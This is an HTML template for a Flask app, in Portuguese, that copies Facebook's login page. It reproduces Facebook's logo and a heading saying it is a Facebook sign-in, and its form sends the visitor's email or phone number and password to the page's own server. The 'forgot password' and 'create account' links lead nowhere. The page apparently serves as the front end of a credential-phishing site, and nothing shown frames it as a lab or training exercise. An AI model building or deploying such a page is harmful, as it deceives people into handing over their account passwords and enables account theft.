<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Início de Sessão</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='css/login.css') }}">
</head>
<body class="login-page">
    <div class="login-container">
        <div class="logo-box">
            <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="60" height="60">
                <path fill="#1877F2" d="M24 4C12.95 4 4 12.95 4 24c0 9.9 7.2 18.1 16.6 19.7V30.9h-5v-6.9h5v-5.3c0-5 3-7.8 7.6-7.8 2.2 0 4.5.4 4.5.4v5h-2.5c-2.5 0-3.3 1.6-3.3 3.2v3.5h5.6l-.9 6.9h-4.7v12.8C36.8 42.1 44 33.9 44 24c0-11.05-8.95-20-20-20z"/>
            </svg>
        </div>
        <h2>Início de Sessão no Facebook</h2>
        <form method="POST">
            <input type="text" name="email" placeholder="Email ou número de telefone" required>
            <input type="password" name="senha" placeholder="Senha" required>
            <button type="submit">Entrar</button>
        </form>
        <div class="extras">
            <a href="#">Esqueceu a senha?</a>
            <a href="#">Criar nova conta</a>
        </div>
    </div>
</body>
</html>
